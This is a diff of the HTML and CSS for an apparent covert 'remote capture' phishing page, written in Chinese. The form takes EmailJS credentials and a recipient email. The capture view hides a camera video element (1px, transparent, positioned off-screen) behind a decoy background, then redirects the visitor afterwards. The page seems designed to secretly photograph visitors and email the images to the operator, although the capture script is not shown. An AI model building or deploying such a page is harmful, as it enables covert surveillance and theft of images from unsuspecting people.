@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>页面加载中...</title>
+    <title>远程拍摄系统</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -11,110 +11,74 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             padding: 20px;
         }
-        .container {
+        
+        /* 主界面 */
+        .main-box {
             background: white;
             border-radius: 16px;
             padding: 24px 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            width: 100%;
-            max-width: 520px;
+            max-width: 500px;
+            margin: 20px auto;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
         }
-        h1 { text-align: center; color: #333; margin-bottom: 20px; font-size: 20px; }
+        .main-box h1 { text-align: center; color: #333; margin-bottom: 20px; font-size: 20px; }
         .form-group { margin-bottom: 14px; }
-        label { display: block; margin-bottom: 5px; color: #555; font-weight: 500; font-size: 13px; }
-        input, select, textarea {
+        .form-group label { display: block; margin-bottom: 5px; color: #555; font-size: 13px; font-weight: 500; }
+        .form-group input, .form-group select, .form-group textarea {
             width: 100%; padding: 10px 12px; border: 2px solid #e0e0e0;
-            border-radius: 8px; font-size: 14px; transition: border-color 0.3s;
+            border-radius: 8px; font-size: 14px;
         }
-        input:focus, select:focus, textarea:focus { outline: none; border-color: #667eea; }
-        textarea { min-height: 60px; resize: vertical; }
+        .form-group input:focus { outline: none; border-color: #667eea; }
         .btn {
             width: 100%; padding: 12px; border: none; border-radius: 8px;
-            font-size: 15px; cursor: pointer; transition: all 0.3s; margin-bottom: 10px;
+            font-size: 15px; cursor: pointer; margin-top: 10px;
         }
-        .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white; font-weight: 600;
-        }
-        .btn-primary:active { transform: scale(0.98); }
-        .link-box {
-            margin-top: 14px; padding: 12px; background: #f8f9fa;
-            border-radius: 8px; border: 1px dashed #ccc; word-break: break-all;
-        }
-        .link-box label { font-size: 12px; color: #666; margin-bottom: 6px; }
-        #kd { color: #999; font-size: 12px; text-decoration: none; display: block; margin-top: 4px; }
-        #copyBtn {
-            background: #28a745; color: white; display: none; font-weight: 600;
-        }
-        .toast {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.8); color: white; padding: 14px 22px;
-            border-radius: 8px; font-size: 14px; display: none; z-index: 1000;
-            white-space: nowrap;
-        }
-        .section-title {
-            font-size: 14px; font-weight: 600; color: #667eea;
-            margin: 16px 0 10px 0; padding-bottom: 6px;
-            border-bottom: 2px solid #f0f0f0;
-        }
+        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; font-weight: 600; }
+        .link-box { margin-top: 14px; padding: 12px; background: #f8f9fa; border-radius: 8px; border: 1px dashed #ccc; }
+        .link-box a { color: #667eea; font-size: 12px; word-break: break-all; text-decoration: none; }
+        #copyBtn { background: #28a745; color: white; display: none; }
+        .section-title { font-size: 13px; font-weight: 600; color: #667eea; margin: 14px 0 8px 0; border-bottom: 1px solid #eee; padding-bottom: 4px; }
 
-        /* 拍摄界面 - 完全自定义 */
-        .capture-container {
-            display: none; text-align: center;
-            width: 100%; min-height: 100vh;
-            position: relative; overflow: hidden;
+        /* 拍摄界面 - 简单稳定布局 */
+        .capture-box {
+            display: none;
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: center;
+            color: white;
+            padding-top: 60px;
         }
-        #video {
-            width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none;
-        }
-        #canvas { display: none; }
-        
-        .bg-layer {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 0; object-fit: cover;
-        }
-        .bg-layer img, .bg-layer video {
-            width: 100%; height: 100%; object-fit: cover;
-        }
-        
-        .content-layer {
-            position: relative; z-index: 1;
-            display: flex; flex-direction: column;
-            justify-content: center; align-items: center;
-            min-height: 100vh; padding: 20px;
-            background: rgba(0,0,0,0.4); /* 半透明遮罩，让文字清晰 */
-        }
-        
-        .capture-title {
-            color: white; font-size: 22px; font-weight: 600;
-            margin-bottom: 12px; text-shadow: 0 2px 4px rgba(0,0,0,0.5);
-        }
-        .capture-desc {
-            color: rgba(255,255,255,0.9); font-size: 15px;
-            margin-bottom: 24px; line-height: 1.5;
-            max-width: 400px; text-shadow: 0 1px 3px rgba(0,0,0,0.5);
-        }
-        .spinner {
-            width: 36px; height: 36px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top-color: #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 16px auto;
-        }
+        .capture-box h2 { font-size: 22px; margin-bottom: 16px; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
+        .capture-box p { font-size: 15px; margin-bottom: 24px; line-height: 1.5; color: rgba(255,255,255,0.9); }
+        .capture-box .warning { background: rgba(255,200,0,0.25); border: 1px solid #ffc800; border-radius: 8px; padding: 12px; margin-bottom: 20px; color: #ffc800; font-size: 14px; }
+        .capture-box button { background: #667eea; color: white; padding: 14px 36px; border: none; border-radius: 30px; font-size: 17px; cursor: pointer; }
+        .capture-box button:active { transform: scale(0.95); }
+        .spinner { width: 36px; height: 36px; border: 3px solid rgba(255,255,255,0.3); border-top-color: #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .btn-allow {
-            background: #667eea; color: white; padding: 14px 36px;
-            border: none; border-radius: 30px; font-size: 16px;
-            cursor: pointer; margin-top: 16px; font-weight: 500;
-        }
-        .btn-allow:active { transform: scale(0.95); }
-        .warning-box {
-            background: rgba(255,200,0,0.25); border: 1px solid #ffc800;
-            border-radius: 8px; padding: 12px; margin-bottom: 16px;
-    
+        #video { width: 1px; height: 1px; opacity: 0; position: absolute; top: -9999px; }
+        #canvas { display: none; }
+        .status { margin-top: 16px; font-size: 14px; color: rgba(255,255,255,0.8); min-height: 20px; }
+        .bg-media { max-width: 100%; border-radius: 12px; margin-bottom: 20px; }
+        .bg-media img, .bg-media video { max-width: 100%; border-radius: 12px; max-height: 300px; object-fit: cover; }
+        
+        .toast { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); color: white; padding: 14px 22px; border-radius: 8px; font-size: 14px; display: none; z-index: 1000; }
+        .error-box { background: #ff4444; color: white; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 13px; display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- 主界面 -->
+    <div class="main-box" id="mainBox">
+        <h1>📷 远程拍摄系统</h1>
+        
+        <div class="section-title">基础设置</div>
+        <div class="form-group"><label>输入ID：</label><input type="text" id="myid" placeholder="输入您的ID"/></div>
+        <div class="form-group"><label>拍摄后跳转到：</label><input type="text" id="url" value="http://baidu.com"/></div>
+
+        <div class="section-title">EmailJS 配置</div>
+        <div class="form-group"><label>Service ID：</label><input type="text" id="ejsService" placeholder="service_xxx"/></div>
+        <div class="form-group"><label>Template ID：</label><input type="text" id="ejsTemplate" placeholder="template_xxx"/></div>
+        <div class="form-group"><label>Public Key：</label><input type="text" id="ejsKey" placeholder="xxx"/></div>
+        <div class="form-group"><label>接收邮箱：</label><input type="text" id="ejsEmail" placeholder="你的邮箱@qq.com"/></div>
